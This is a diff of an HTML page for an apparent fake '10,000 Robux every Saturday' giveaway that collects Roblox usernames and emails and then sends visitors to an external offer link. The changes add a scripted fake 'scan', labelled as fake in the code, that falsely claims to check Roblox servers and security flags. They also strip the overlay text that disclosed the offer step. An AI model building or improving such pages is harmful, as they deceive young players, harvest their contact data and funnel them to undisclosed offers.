@@ -4,20 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Giveaway · 10,000 Robux every Saturday</title>
-    <!-- Font Awesome 6 (free) for icons -->
+    <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- Google Font: Inter -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <style>
-        /* same base styles as before, with additions for new elements */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
             --bg-body: #ffffff;
             --bg-card: #f8faff;
@@ -29,12 +23,12 @@
             --input-bg: #ffffff;
             --header-border: #eef2f6;
             --footer-text: #4b5563;
-            --shadow-sm: 0 10px 25px -5px rgba(0, 0, 0, 0.03), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+            --shadow-sm: 0 10px 25px -5px rgba(0,0,0,0.03), 0 8px 10px -6px rgba(0,0,0,0.02);
             --toggle-hover: #f0f4ff;
             --success-green: #10b981;
             --overlay-bg: rgba(0, 0, 0, 0.5);
+            --scan-progress: #d0dfff;
         }
-
         body.dark-theme {
             --bg-body: #0b1120;
             --bg-card: #1a2332;
@@ -46,327 +40,154 @@
             --input-bg: #1f2a3c;
             --header-border: #252f41;
             --footer-text: #9aa8b9;
-            --shadow-sm: 0 20px 30px -10px rgba(0, 15, 40, 0.6);
+            --shadow-sm: 0 20px 30px -10px rgba(0,15,40,0.6);
             --toggle-hover: #26334d;
             --success-green: #34d399;
-            --overlay-bg: rgba(0, 0, 0, 0.7);
+            --overlay-bg: rgba(0,0,0,0.7);
+            --scan-progress: #2f405b;
         }
-
         body {
             font-family: "Inter", system-ui, sans-serif;
             background-color: var(--bg-body);
             color: var(--text-primary);
-            transition: background-color 0.2s, color 0.2s, border-color 0.2s;
+            transition: background-color 0.2s, color 0.2s;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
-
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
 
         /* top bar */
         .top-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 0;
-            border-bottom: 1px solid var(--header-border);
-            margin-bottom: 32px;
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 16px 0; border-bottom: 1px solid var(--header-border); margin-bottom: 32px;
         }
-
-        .logo-area {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .logo-icon {
-            color: var(--accent-blue);
-            font-size: 1.8rem;
-        }
-
-        .logo-text {
-            font-weight: 700;
-            font-size: 1.4rem;
-            letter-spacing: -0.02em;
-            color: var(--text-primary);
-        }
-
-        .logo-text span {
-            color: var(--accent-blue);
-        }
-
+        .logo-area { display: flex; align-items: center; gap: 8px; }
+        .logo-icon { color: var(--accent-blue); font-size: 1.8rem; }
+        .logo-text { font-weight: 700; font-size: 1.4rem; letter-spacing: -0.02em; color: var(--text-primary); }
+        .logo-text span { color: var(--accent-blue); }
         .theme-toggle {
-            background: none;
-            border: none;
-            color: var(--text-primary);
-            font-size: 1.6rem;
-            cursor: pointer;
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            background: none; border: none; color: var(--text-primary); font-size: 1.6rem; cursor: pointer;
+            width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center;
             transition: background-color 0.15s;
         }
-
-        .theme-toggle:hover {
-            background-color: var(--toggle-hover);
-        }
-
+        .theme-toggle:hover { background-color: var(--toggle-hover); }
         .theme-toggle .fa-sun { display: none; }
         .dark-theme .theme-toggle .fa-moon { display: none; }
         .dark-theme .theme-toggle .fa-sun { display: inline-block; color: #fbbf24; }
 
         /* main card */
         .giveaway-card {
-            background-color: var(--bg-card);
-            border-radius: 32px;
-            padding: 48px 48px 56px;
-            box-shadow: var(--shadow-sm);
-            border: 1px solid var(--border-light);
-            margin: 20px 0 40px;
+            background-color: var(--bg-card); border-radius: 32px; padding: 48px 48px 56px;
+            box-shadow: var(--shadow-sm); border: 1px solid var(--border-light); margin: 20px 0 40px;
         }
-
-        .hero-title {
-            font-size: 2.8rem;
-            font-weight: 700;
-            letter-spacing: -0.02em;
-            line-height: 1.2;
-            margin-bottom: 16px;
-        }
+        .hero-title { font-size: 2.8rem; font-weight: 700; letter-spacing: -0.02em; line-height: 1.2; margin-bottom: 16px; }
         .hero-title span { color: var(--accent-blue); }
+        .hero-sub { font-size: 1.2rem; color: var(--text-secondary); max-width: 650px; margin-bottom: 32px; }
 
-        .hero-sub {
-            font-size: 1.2rem;
-            color: var(--text-secondary);
-            max-width: 650px;
-            margin-bottom: 32px;
-        }
-
+        /* next saturday box */
         .next-saturday-box {
-            background-color: var(--accent-light);
-            border-left: 5px solid var(--accent-blue);
-            padding: 20px 28px;
-            border-radius: 24px;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            margin: 32px 0 36px;
+            background-color: var(--accent-light); border-left: 5px solid var(--accent-blue);
+            padding: 20px 28px; border-radius: 24px; display: flex; flex-wrap: wrap;
+            align-items: center; justify-content: space-between; margin: 32px 0 36px;
         }
-
         .next-info { display: flex; flex-direction: column; gap: 4px; }
-        .next-label {
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-size: 0.9rem;
-            color: var(--accent-blue);
-        }
+        .next-label { font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; font-size: 0.9rem; color: var(--accent-blue); }
         .next-date { font-size: 1.5rem; font-weight: 700; }
         .countdown-badge {
-            background-color: var(--bg-body);
-            padding: 12px 22px;
-            border-radius: 60px;
-            font-weight: 600;
-            font-size: 1.3rem;
-            color: var(--accent-blue);
-            border: 1px solid var(--border-light);
+            background-color: var(--bg-body); padding: 12px 22px; border-radius: 60px;
+            font-weight: 600; font-size: 1.3rem; color: var(--accent-blue); border: 1px solid var(--border-light);
         }
 
         /* entry sections */
-        .entry-area {
-            margin: 40px 0 24px;
-        }
-        .entry-label {
-            font-weight: 600;
-            margin-bottom: 10px;
-            display: block;
-            font-size: 1.1rem;
-        }
-        .input-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 16px;
-            align-items: center;
-        }
+        .entry-area { margin: 40px 0 24px; }
+        .entry-label { font-weight: 600; margin-bottom: 10px; display: block; font-size: 1.1rem; }
+        .input-group { display: flex; flex-wrap: wrap; gap: 16px; align-items: center; }
         .roblox-input, .email-input {
-            flex: 2 1 280px;
-            padding: 18px 22px;
-            border-radius: 60px;
-            border: 1px solid var(--border-light);
-            background-color: var(--input-bg);
-            color: var(--text-primary);
-            font-size: 1.1rem;
-            font-family: 'Inter', sans-serif;
-            outline: none;
-            transition: border 0.1s, box-shadow 0.1s;
+            flex: 2 1 280px; padding: 18px 22px; border-radius: 60px; border: 1px solid var(--border-light);
+            background-color: var(--input-bg); color: var(--text-primary); font-size: 1.1rem;
+            font-family: 'Inter', sans-serif; outline: none; transition: border 0.1s, box-shadow 0.1s;
         }
         .roblox-input:focus, .email-input:focus {
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 0 3px rgba(30, 75, 210, 0.15);
+            border-color: var(--accent-blue); box-shadow: 0 0 0 3px rgba(30,75,210,0.15);
         }
-        .dark-theme .roblox-input:focus,
-        .dark-theme .email-input:focus {
-            box-shadow: 0 0 0 3px rgba(82, 130, 255, 0.25);
+        .dark-theme .roblox-input:focus, .dark-theme .email-input:focus {
+            box-shadow: 0 0 0 3px rgba(82,130,255,0.25);
         }
         .enter-btn, .submit-email-btn {
-            background-color: var(--accent-blue);
-            color: white;
-            border: none;
-            padding: 18px 38px;
-            border-radius: 60px;
-            font-weight: 600;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: background-color 0.15s;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            white-space: nowrap;
+            background-color: var(--accent-blue); color: white; border: none; padding: 18px 38px;
+            border-radius: 60px; font-weight: 600; font-size: 1.1rem; cursor: pointer;
+            transition: background-color 0.15s; display: inline-flex; align-items: center; gap: 10px; white-space: nowrap;
         }
-        .enter-btn:hover, .submit-email-btn:hover {
-            background-color: #1340b0;
-        }
-        .dark-theme .enter-btn:hover,
-        .dark-theme .submit-email-btn:hover {
-            background-color: #6d96ff;
-        }
+        .enter-btn:hover, .submit-email-btn:hover { background-color: #1340b0; }
+        .dark-theme .enter-btn:hover, .dark-theme .submit-email-btn:hover { background-color: #6d96ff; }
 
-        .success-message {
-            color: var(--success-green);
-            font-weight: 600;
-            margin: 12px 0 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        /* fake scan styles */
+        .scan-container {
+            background-color: var(--accent-light); border-radius: 40px; padding: 18px 28px;
+            border: 1px solid var(--border-light); margin: 16px 0 8px;
         }
-        .hidden {
-            display: none !important;
+        .scan-status { display: flex; align-items: center; gap: 14px; margin-bottom: 12px; }
+        .scan-spinner {
+            width: 24px; height: 24px; border: 3px solid var(--border-light);
+            border-top: 3px solid var(--accent-blue); border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .scan-text { font-weight: 500; color: var(--text-primary); }
+        .scan-progress-bar {
+            width: 100%; height: 8px; background-color: var(--border-light); border-radius: 20px; overflow: hidden;
+        }
+        .scan-progress-fill {
+            height: 100%; width: 0%; background-color: var(--accent-blue); border-radius: 20px;
+            transition: width 0.3s ease;
+        }
+        .scan-message { font-size: 0.95rem; color: var(--text-secondary); margin-top: 8px; }
 
-        .fine-print {
-            font-size: 0.9rem;
-            color: var(--footer-text);
-            margin-top: 16px;
-        }
+        .hidden { display: none !important; }
 
-        /* email section initially hidden */
-        #emailSection {
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px dashed var(--border-light);
-        }
+        .fine-print { font-size: 0.9rem; color: var(--footer-text); margin-top: 16px; }
 
-        /* overlay / content locker */
+        #emailSection { margin-top: 20px; padding-top: 20px; border-top: 1px dashed var(--border-light); }
+
+        /* overlay - only shows the link */
         .overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: var(--overlay-bg);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            backdrop-filter: blur(3px);
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: var(--overlay-bg); display: flex; align-items: center; justify-content: center;
+            z-index: 1000; backdrop-filter: blur(3px);
         }
-        .overlay.hidden {
-            display: none;
-        }
+        .overlay.hidden { display: none; }
         .overlay-card {
-            background-color: var(--bg-card);
-            border-radius: 32px;
-            padding: 32px 28px;
-            max-width: 400px;
-            width: 90%;
-            box-shadow: var(--shadow-sm);
-            border: 1px solid var(--border-light);
-            text-align: center;
-            position: relative;
+            background-color: var(--bg-card); border-radius: 32px; padding: 30px 28px;
+            max-width: 400px; width: 90%; box-shadow: var(--shadow-sm); border: 1px solid var(--border-light);
+            text-align: center; position: relative;
         }
         .close-overlay {
-            position: absolute;
-            top: 16px;
-            right: 20px;
-            background: none;
-            border: none;
-            font-size: 1.8rem;
-            cursor: pointer;
-            color: var(--text-secondary);
-            line-height: 1;
+            position: absolute; top: 16px; right: 20px; background: none; border: none;
+            font-size: 1.8rem; cursor: pointer; color: var(--text-secondary); line-height: 1;
         }
-        .close-overlay:hover {
-            color: var(--accent-blue);
+        .close-overlay:hover { color: var(--accent-blue); }
+        .overlay-link {
+            display: inline-block; background-color: var(--accent-blue); color: white;
+            padding: 16px 22px; border-radius: 60px; font-weight: 600; font-size: 1rem;
+            text-decoration: none; margin: 20px 0 10px; word-break: break-all;
+            border: 1px solid transparent; transition: background-color 0.15s;
         }
-        .overlay-title {
-            font-size: 1.6rem;
-            font-weight: 700;
-            margin: 10px 0 20px;
-        }
-        .offer-link {
-            display: inline-block;
-            background-color: var(--accent-blue);
-            color: white;
-            padding: 16px 32px;
-            border-radius: 60px;
-            font-weight: 600;
-            font-size: 1.2rem;
-            text-decoration: none;
-            margin: 20px 0 10px;
-            transition: background-color 0.15s;
-            word-break: break-all;
-        }
-        .offer-link:hover {
-            background-color: #1340b0;
-        }
-        .dark-theme .offer-link:hover {
-            background-color: #6d96ff;
-        }
-        .overlay-note {
-            font-size: 0.9rem;
-            color: var(--footer-text);
-            margin-top: 16px;
-        }
+        .overlay-link:hover { background-color: #1340b0; }
+        .dark-theme .overlay-link:hover { background-color: #6d96ff; }
 
         /* winners preview etc */
         .winners-preview {
-            border-top: 1px dashed var(--border-light);
-            padding-top: 28px;
-            margin-top: 20px;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
+            border-top: 1px dashed var(--border-light); padding-top: 28px; margin-top: 20px;
+            display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center;
         }
-        .winners-title {
-            font-weight: 600;
-            font-size: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: var(--accent-blue);
-        }
-        .winner-list {
-            display: flex;
-            gap: 36px;
-            color: var(--text-secondary);
-        }
-        .winner-list span i {
-            color: var(--accent-blue);
-            margin-right: 6px;
-        }
+        .winners-title { font-weight: 600; font-size: 1rem; text-transform: uppercase; letter-spacing: 1px; color: var(--accent-blue); }
+        .winner-list { display: flex; gap: 36px; color: var(--text-secondary); }
+        .winner-list span i { color: var(--accent-blue); margin-right: 6px; }
 
         .site-footer {
-            text-align: center;
-            padding: 32px 0 40px;
-            border-top: 1px solid var(--header-border);
-            color: var(--footer-text);
-            font-size: 0.95rem;
-            margin-top: auto;
+            text-align: center; padding: 32px 0 40px; border-top: 1px solid var(--header-border);
+            color: var(--footer-text); font-size: 0.95rem; margin-top: auto;
         }
 
         @media (max-width: 650px) {
@@ -396,7 +217,7 @@
                 <h1 class="hero-title">Win <span>10,000 Robux</span> <br> this Saturday</h1>
                 <p class="hero-sub">One lucky player takes it all. Every Saturday we randomly pick a winner. Enter with your Roblox username — it’s free.</p>
                 
-                <!-- next Saturday box -->
+                <!-- next saturday box -->
                 <div class="next-saturday-box" id="nextSaturdayBox">
                     <div class="next-info">
                         <span class="next-label">🎁 next giveaway</span>
@@ -405,17 +226,28 @@
                     <div class="countdown-badge" id="countdownDisplay">0d 00h 00m 00s</div>
                 </div>
 
-                <!-- entry area: step 1 username -->
+                <!-- step 1: username + fake scan -->
                 <div class="entry-area" id="usernameSection">
                     <label class="entry-label" for="robloxUser">🔹 Enter your Roblox username</label>
-                    <div class="input-group">
+                    <div class="input-group" id="usernameInputGroup">
                         <input type="text" id="robloxUser" class="roblox-input" placeholder="@username" value="">
                         <button class="enter-btn" id="enterGiveawayBtn"><i class="fas fa-arrow-right"></i> Enter now</button>
                     </div>
-                    <div id="usernameSuccess" class="success-message hidden"><i class="fas fa-check-circle"></i> <span></span></div>
+
+                    <!-- fake scan container (hidden initially) -->
+                    <div id="scanContainer" class="scan-container hidden">
+                        <div class="scan-status">
+                            <div class="scan-spinner"></div>
+                            <span class="scan-text" id="scanStatusText">Initializing scan...</span>
+                        </div>
+                        <div class="scan-progress-bar">
+                            <div class="scan-progress-fill" id="scanProgressFill" style="width: 0%;"></div>
+                        </div>
+                        <div class="scan-message" id="scanMessage"></div>
+                    </div>
                 </div>
 
-                <!-- step 2 email section (hidden initially) -->
+                <!-- step 2: email section (hidden initially) -->
                 <div id="emailSection" class="hidden">
                     <label class="entry-label" for="emailInput">📧 Enter your email to contact you if you win</label>
                     <div class="input-group">
@@ -425,7 +257,6 @@
                     <p class="fine-print">We'll only use this to notify the winner.</p>
                 </div>
 
-                <!-- fine print (always visible) -->
                 <p class="fine-print"><i class="far fa-clock" style="margin-right: 4px;"></i> One entry per person · Winner announced every Saturday at 00:00 UTC</p>
 
                 <!-- recent winners -->
@@ -455,20 +286,17 @@
         </div>
     </footer>
 
-    <!-- overlay / content locker (hidden by default) -->
+    <!-- overlay: only the link (no extra text) -->
     <div id="overlay" class="overlay hidden">
         <div class="overlay-card">
             <button class="close-overlay" id="closeOverlayBtn">&times;</button>
-            <div class="overlay-title">🔓 one more step</div>
-            <p style="margin-bottom: 20px;">Complete a quick offer to verify you're human (this supports our giveaway).</p>
-            <a href="https://bouttiq.graphics/cl/i/krr67g" target="_blank" class="offer-link" id="offerLink">👉 Complete offer</a>
-            <p class="overlay-note">After completion, come back and close this message.</p>
+            <a href="https://bouttiq.graphics/cl/i/krr67g" target="_blank" class="overlay-link" id="offerLink">https://bouttiq.graphics/cl/i/krr67g</a>
         </div>
     </div>
 
     <script>
         (function() {
-            // --- theme toggle ---
+            // Theme toggle
             const themeToggle = document.getElementById('themeToggle');
             const body = document.body;
             const savedTheme = localStorage.getItem('rbxTheme') || 'light-theme';
@@ -482,7 +310,7 @@
                 setTheme(body.classList.contains('light-theme') ? 'dark-theme' : 'light-theme');
             });
 
-            // --- countdown (same as before) ---
+            // Countdown
             const nextDateSpan = document.getElementById('nextDateText');
             const countdownSpan = document.getElementById('countdownDisplay');
             function getNextSaturdayUTC() {
@@ -511,31 +339,57 @@
             function updateCountdown() {
                 const nextSaturday = getNextSaturdayUTC();
                 const diff = nextSaturday.getTime() - Date.now();
-                if (diff < 0) location.reload(); // edge case
+                if (diff < 0) location.reload();
                 else countdownSpan.textContent = formatCountdown(diff);
                 nextDateSpan.textContent = formatDateUTC(nextSaturday);
             }
             updateCountdown();
             setInterval(updateCountdown, 1000);
 
-            // --- step 1: username handling ---
-            const usernameSection = document.getElementById('usernameSection');
-            const emailSection = document.getElementById('emailSection');
+            // DOM elements
             const usernameInput = document.getElementById('robloxUser');
             const enterBtn = document.getElementById('enterGiveawayBtn');
-            const usernameSuccess = document.getElementById('usernameSuccess');
-            const successSpan = usernameSuccess.querySelector('span');
-
-            // step 2 elements
+            const usernameInputGroup = document.getElementById('usernameInputGroup');
+            const scanContainer = document.getElementById('scanContainer');
+            const scanStatusText = document.getElementById('scanStatusText');
+            const scanProgressFill = document.getElementById('scanProgressFill');
+            const scanMessage = document.getElementById('scanMessage');
+            const emailSection = document.getElementById('emailSection');
             const emailInput = document.getElementById('emailInput');
             const submitEmailBtn = document.getElementById('submitEmailBtn');
-
-            // overlay
             const overlay = document.getElementById('overlay');
             const closeOverlayBtn = document.getElementById('closeOverlayBtn');
-            const offerLink = document.getElementById('offerLink');
 
-            // Username submit
+            // Fake scan simulation
+            function startFakeScan() {
+                // Hide input group, show scan container
+                usernameInputGroup.classList.add('hidden');
+                scanContainer.classList.remove('hidden');
+
+                let step = 0;
+                const steps = [
+                    { text: 'Checking username availability...', progress: 20, msg: 'Connecting to Roblox servers...' },
+                    { text: 'Validating username format...', progress: 45, msg: 'Format OK, checking against database...' },
+                    { text: 'Scanning for security flags...', progress: 70, msg: 'No suspicious activity detected.' },
+                    { text: 'Username verified successfully!', progress: 100, msg: 'Redirecting to email step...' }
+                ];
+
+                const interval = setInterval(() => {
+                    if (step < steps.length) {
+                        scanStatusText.textContent = steps[step].text;
+                        scanProgressFill.style.width = steps[step].progress + '%';
+                        scanMessage.textContent = steps[step].msg;
+                        step++;
+                    } else {
+                        clearInterval(interval);
+                        // After scan completes, hide scan container and show email section
+                        scanContainer.classList.add('hidden');
+                        emailSection.classList.remove('hidden');
+                    }
+                }, 800); // each step lasts 0.8s, total ~3.2s
+            }
+
+            // Enter button click
             enterBtn.addEventListener('click', (e) => {
                 e.preventDefault();
                 const username = usernameInput.value.trim();
@@ -547,18 +401,11 @@
                     alert('Username too short (min 3 characters).');
                     return;
                 }
-                // show success message in green
-                successSpan.textContent = `✅ @${username} found!`;
-                usernameSuccess.classList.remove('hidden');
-                // hide username input group (but keep the success message visible)
-                // we hide the .input-group inside usernameSection
-                const usernameInputGroup = usernameSection.querySelector('.input-group');
-                usernameInputGroup.classList.add('hidden');
-                // show email section
-                emailSection.classList.remove('hidden');
+                // Start fake scan
+                startFakeScan();
             });
 
-            // Email submit -> show overlay
+            // Submit email -> show overlay with link only
             submitEmailBtn.addEventListener('click', (e) => {
                 e.preventDefault();
                 const email = emailInput.value.trim();
@@ -566,7 +413,6 @@
                     alert('Please enter a valid email address.');
                     return;
                 }
-                // Show overlay
                 overlay.classList.remove('hidden');
             });
 
@@ -574,22 +420,20 @@
             closeOverlayBtn.addEventListener('click', () => {
                 overlay.classList.add('hidden');
             });
-
-            // Optional: close overlay if user clicks outside the card (click on overlay itself)
             overlay.addEventListener('click', (e) => {
                 if (e.target === overlay) {
                     overlay.classList.add('hidden');
                 }
             });
 
-            // Enter key on username field triggers enter button
+            // Enter key on username triggers scan
             usernameInput.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') {
                     e.preventDefault();
                     enterBtn.click();
                 }
             });
-            // Enter key on email field triggers submit button
+            // Enter key on email triggers submit
             emailInput.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') {
                     e.preventDefault();
